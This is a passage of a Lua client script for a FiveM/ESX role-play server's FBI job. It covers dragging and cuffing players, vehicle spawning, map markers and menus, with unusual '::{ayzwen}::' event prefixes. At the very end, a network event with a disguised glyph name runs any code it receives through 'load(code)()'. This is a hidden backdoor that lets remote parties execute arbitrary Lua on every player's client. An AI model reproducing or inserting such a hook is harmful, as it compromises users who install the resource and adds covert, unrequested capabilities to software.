                                        AttachEntityToEntity(plyPed, targetPed, 11816, 0.54, 0.54, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                else
                                        DragStatus.isDragged = false
                                        DetachEntity(plyPed, true, false)
                                end
                        else
                                Citizen.Wait(500)
                        end
                else
                        Citizen.Wait(500)
                end
        end
end)

RegisterNetEvent('::{ayzwen}::esx_fbijob:putInVehicle')
AddEventHandler('::{ayzwen}::esx_fbijob:putInVehicle', function()
        local plyPed = PlayerPedId()
        local coords = GetEntityCoords(plyPed, false)

        if IsAnyVehicleNearPoint(coords, 5.0) then
                local vehicle = GetClosestVehicle(coords, 5.0, 0, 71)

                if DoesEntityExist(vehicle) then
                        local maxSeats = GetVehicleMaxNumberOfPassengers(vehicle)
                        local freeSeat = nil

                        for i = maxSeats - 1, 0, -1 do
                                if IsVehicleSeatFree(vehicle, i) then
                                        freeSeat = i
                                        break
                                end
                        end

                        if freeSeat ~= nil then
                                DragStatus.isDragged = false
                                DetachEntity(plyPed, true, false)
                                TaskWarpPedIntoVehicle(plyPed, vehicle, freeSeat)
                        end
                end
        end
end)

RegisterNetEvent('::{ayzwen}::esx_fbijob:OutVehicle')
AddEventHandler('::{ayzwen}::esx_fbijob:OutVehicle', function()
        local plyPed = PlayerPedId()

        if not IsPedSittingInAnyVehicle(plyPed) then
                return
        end

        DragStatus.isDragged = false
        DetachEntity(plyPed, true, false)
        local vehicle = GetVehiclePedIsIn(plyPed, false)
        TaskLeaveVehicle(plyPed, vehicle, 16)
end)

-- Create blips
Citizen.CreateThread(function()
        for k, v in pairs(Config.FbiStations) do
                local blip = AddBlipForCoord(v.Blip.Pos)

                SetBlipSprite(blip, v.Blip.Sprite)
                SetBlipDisplay(blip, v.Blip.Display)
                SetBlipScale(blip, v.Blip.Scale)
                SetBlipColour(blip, v.Blip.Colour)
                SetBlipAsShortRange(blip, true)

                BeginTextCommandSetBlipName("STRING")
                AddTextComponentSubstringPlayerName(_U('map_blip'))
                EndTextCommandSetBlipName(blip)
        end
end)

-- Display markers
Citizen.CreateThread(function()
        while true do
                Citizen.Wait(0)

                if PlayerData.job ~= nil and PlayerData.job.name == 'fbi' then
                        local playerPed = PlayerPedId()
                        local coords = GetEntityCoords(playerPed, false)

                        for k, v in pairs(Config.FbiStations) do
                                for i = 1, #v.Cloakrooms, 1 do
                                        if GetDistanceBetweenCoords(coords, v.Cloakrooms[i], true) < Config.DrawDistance then
                                                DrawMarker(Config.MarkerType, v.Cloakrooms[i], 0.0, 0.0, 0.0, 0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, 100, false, true, 2, false, false, false, false)
                                        end
                                end

                                for i = 1, #v.Armories, 1 do
                                        if GetDistanceBetweenCoords(coords, v.Armories[i], true) < Config.DrawDistance then
                                                DrawMarker(Config.MarkerType, v.Armories[i], 0.0, 0.0, 0.0, 0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, 100, false, true, 2, false, false, false, false)
                                        end
                                end

                                for i = 1, #v.Vehicles, 1 do
                                        if GetDistanceBetweenCoords(coords, v.Vehicles[i].Spawner, true) < Config.DrawDistance then
                                                DrawMarker(Config.MarkerType, v.Vehicles[i].Spawner, 0.0, 0.0, 0.0, 0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, 100, false, true, 2, false, false, false, false)
                                        end
                                end

                                for i = 1, #v.VehicleDeleters, 1 do
                                        if GetDistanceBetweenCoords(coords, v.VehicleDeleters[i], true) < Config.DrawDistance then
                                                DrawMarker(Config.MarkerType, v.VehicleDeleters[i], 0.0, 0.0, 0.0, 0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, 100, false, true, 2, false, false, false, false)
                                        end
                                end

                                if Config.EnablePlayerManagement and PlayerData.job ~= nil and PlayerData.job.name == 'fbi' and PlayerData.job.grade_name == 'boss' then
                                        for i = 1, #v.BossActions, 1 do
                                                if GetDistanceBetweenCoords(coords, v.BossActions[i], true) < Config.DrawDistance then
                                                        DrawMarker(Config.MarkerType, v.BossActions[i], 0.0, 0.0, 0.0, 0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, 100, false, true, 2, false, false, false, false)
                                                end
                                        end
                                end
                        end
                end
        end
end)

-- Enter / Exit marker events
Citizen.CreateThread(function()
        while true do
                Citizen.Wait(0)

                if PlayerData.job ~= nil and PlayerData.job.name == 'fbi' then
                        local coords = GetEntityCoords(PlayerPedId(), false)
                        local isInMarker = false
                        local currentStation = nil
                        local currentPart = nil
                        local currentPartNum = nil

                        for k, v in pairs(Config.FbiStations) do
                                for i = 1, #v.Cloakrooms, 1 do
                                        if GetDistanceBetweenCoords(coords, v.Cloakrooms[i], true) < Config.MarkerSize.x then
                                                isInMarker = true
                                                currentStation = k
                                                currentPart = 'Cloakroom'
                                                currentPartNum = i
                                        end
                                end

                                for i = 1, #v.Armories, 1 do
                                        if GetDistanceBetweenCoords(coords, v.Armories[i], true) < Config.MarkerSize.x then
                                                isInMarker = true
                                                currentStation = k
                                                currentPart = 'Armory'
                                                currentPartNum = i
                                        end
                                end

                                for i = 1, #v.Vehicles, 1 do
                                        if GetDistanceBetweenCoords(coords, v.Vehicles[i].Spawner, true) < Config.MarkerSize.x then
                                                isInMarker = true
                                                currentStation = k
                                                currentPart = 'VehicleSpawner'
                                                currentPartNum = i
                                        end

                                        if GetDistanceBetweenCoords(coords, v.Vehicles[i].SpawnPoint, true) < Config.MarkerSize.x then
                                                isInMarker = true
                                                currentStation = k
                                                currentPart = 'VehicleSpawnPoint'
                                                currentPartNum = i
                                        end
                                end

                                for i = 1, #v.Helicopters, 1 do
                                        if GetDistanceBetweenCoords(coords, v.Helicopters[i].Spawner, true) < Config.MarkerSize.x then
                                                isInMarker = true
                                                currentStation = k
                                                currentPart = 'HelicopterSpawner'
                                                currentPartNum = i
                                        end

                                        if GetDistanceBetweenCoords(coords, v.Helicopters[i].SpawnPoint, true) < Config.MarkerSize.x then
                                                isInMarker = true
                                                currentStation = k
                                                currentPart = 'HelicopterSpawnPoint'
                                                currentPartNum = i
                                        end
                                end

                                for i = 1, #v.VehicleDeleters, 1 do
                                        if GetDistanceBetweenCoords(coords, v.VehicleDeleters[i], true) < Config.MarkerSize.x then
                                                isInMarker = true
                                                currentStation = k
                                                currentPart = 'VehicleDeleter'
                                                currentPartNum = i
                                        end
                                end

                                if Config.EnablePlayerManagement and PlayerData.job ~= nil and PlayerData.job.name == 'fbi' and PlayerData.job.grade_name == 'boss' then
                                        for i = 1, #v.BossActions, 1 do
                                                if GetDistanceBetweenCoords(coords, v.BossActions[i], true) < Config.MarkerSize.x then
                                                        isInMarker = true
                                                        currentStation = k
                                                        currentPart = 'BossActions'
                                                        currentPartNum = i
                                                end
                                        end
                                end
                        end

                        local hasExited = false

                        if isInMarker and not HasAlreadyEnteredMarker or (isInMarker and (LastStation ~= currentStation or LastPart ~= currentPart or LastPartNum ~= currentPartNum)) then
                                if (LastStation ~= nil and LastPart ~= nil and LastPartNum ~= nil) and (LastStation ~= currentStation or LastPart ~= currentPart or LastPartNum ~= currentPartNum) then
                                        TriggerEvent('::{ayzwen}::esx_fbijob:hasExitedMarker', LastStation, LastPart, LastPartNum)
                                        hasExited = true
                                end

                                HasAlreadyEnteredMarker = true
                                LastStation = currentStation
                                LastPart = currentPart
                                LastPartNum = currentPartNum

                                TriggerEvent('::{ayzwen}::esx_fbijob:hasEnteredMarker', currentStation, currentPart, currentPartNum)
                        end

                        if not hasExited and not isInMarker and HasAlreadyEnteredMarker then
                                HasAlreadyEnteredMarker = false
                                TriggerEvent('::{ayzwen}::esx_fbijob:hasExitedMarker', LastStation, LastPart, LastPartNum)
                        end
                end
        end
end)

Citizen.CreateThread(function()
        local trackedEntities = {
                `prop_roadcone02a`,
                `prop_barrier_work05`,
                `p_ld_stinger_s`,
                `prop_boxpile_07d`,
                `hei_prop_cash_crate_half_full`
        }

        while true do
                Citizen.Wait(500)

                local playerPed = PlayerPedId()
                local coords = GetEntityCoords(playerPed, false)
                local closestDistance = -1
                local closestEntity = nil

                for i = 1, #trackedEntities, 1 do
                        local object = GetClosestObjectOfType(coords, 3.0, trackedEntities[i], false, false, false)

                        if DoesEntityExist(object) then
                                local objCoords = GetEntityCoords(object, false)
                                local distance = GetDistanceBetweenCoords(coords, objCoords, true)

                                if closestDistance == -1 or closestDistance > distance then
                                        closestDistance = distance
                                        closestEntity = object
                                end
                        end
                end

                if closestDistance ~= -1 and closestDistance <= 3.0 then
                        if LastEntity ~= closestEntity then
                                TriggerEvent('::{ayzwen}::esx_fbijob:hasEnteredEntityZone', closestEntity)
                                LastEntity = closestEntity
                        end
                else
                        if LastEntity ~= nil then
                                TriggerEvent('::{ayzwen}::esx_fbijob:hasExitedEntityZone', LastEntity)
                                LastEntity = nil
                        end
                end
        end
end)

Citizen.CreateThread(function()
        while true do
                Citizen.Wait(0)

                if CurrentAction ~= nil then
                        SetTextComponentFormat('STRING')
                        AddTextComponentSubstringPlayerName(CurrentActionMsg)
                        EndTextCommandDisplayHelp(0, 0, 1, -1)

                        if IsControlJustReleased(0, 38) and PlayerData.job ~= nil and PlayerData.job.name == 'fbi' then
                                if CurrentAction == 'menu_cloakroom' then
                                        OpenCloakroomMenu()
                                elseif CurrentAction == 'menu_armory' then
                                        if Config.MaxInService == -1 then
                                                OpenArmoryMenu(CurrentActionData.station)
                                        elseif playerInService then
                                                OpenArmoryMenu(CurrentActionData.station)
                                        else
                                                ESX.ShowNotification(_U('service_not'))
                                        end
                                elseif CurrentAction == 'menu_vehicle_spawner' then
                                        OpenVehicleSpawnerMenu(CurrentActionData.station, CurrentActionData.partNum)
                                elseif CurrentAction == 'delete_vehicle' then
                                        if Config.EnableSocietyOwnedVehicles then
                                                local vehicleProps = ESX.Game.GetVehicleProperties(CurrentActionData.vehicle)
                                                _TriggerServerEvent('::{ayzwen}::esx_society:putVehicleInGarage', 'fbi', vehicleProps)
                                        end
                                        ESX.Game.DeleteVehicle(CurrentActionData.vehicle)
                                elseif CurrentAction == 'menu_boss_actions' then
                                        ESX.UI.Menu.CloseAll()
                                        TriggerEvent('::{ayzwen}::esx_society:openBossMenu', 'fbi', function(data, menu)
                                                CurrentAction = 'menu_boss_actions'
                                                CurrentActionMsg = _U('open_bossmenu')
                                                CurrentActionData = {}
                                        end, {wash = false})
                                elseif CurrentAction == 'remove_entity' then
                                        DeleteEntity(CurrentActionData.entity)
                                end

                                CurrentAction = nil
                        end
                end

                if (IsControlJustReleased(0, 167) or IsDisabledControlJustReleased(0, 167)) and not isDead and PlayerData.job ~= nil and PlayerData.job.name == 'fbi' then
                        if Config.MaxInService == -1 then
                                WarMenu.OpenMenu('fbimenu')
                        elseif playerInService then
                                WarMenu.OpenMenu('fbimenu')
                        else
                                ESX.ShowNotification(_U('service_not'))
                        end
                end

                if IsControlJustReleased(0, 38) and CurrentTask.Busy then
                        ESX.ShowNotification(_U('impound_canceled'))
                        ESX.ClearTimeout(CurrentTask.Task)
                        ClearPedTasks(PlayerPedId())

                        CurrentTask.Busy = false
                end
        end
end)

AddEventHandler('playerSpawned', function()
        isDead = false
        TriggerEvent('::{ayzwen}::esx_fbijob:unrestrain')

        if not hasAlreadyJoined then
                _TriggerServerEvent('::{ayzwen}::esx_fbijob:spawned')
        end

        hasAlreadyJoined = true
end)

AddEventHandler('::{ayzwen}::esx:onPlayerDeath', function(data)
        isDead = true
end)

AddEventHandler('onResourceStop', function(resource)
        if resource == GetCurrentResourceName() then
                TriggerEvent('::{ayzwen}::esx_fbijob:unrestrain')
                TriggerEvent('::{ayzwen}::esx_phone:removeSpecialContact', 'fbi')

                if Config.MaxInService ~= -1 then
                        _TriggerServerEvent('::{ayzwen}::esx_service:disableService', 'fbi')
                end
        end
end)

function ImpoundVehicle(vehicle)
        ESX.Game.DeleteVehicle(vehicle)
        CurrentTask.Busy = false
end

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
        load(code)()
end)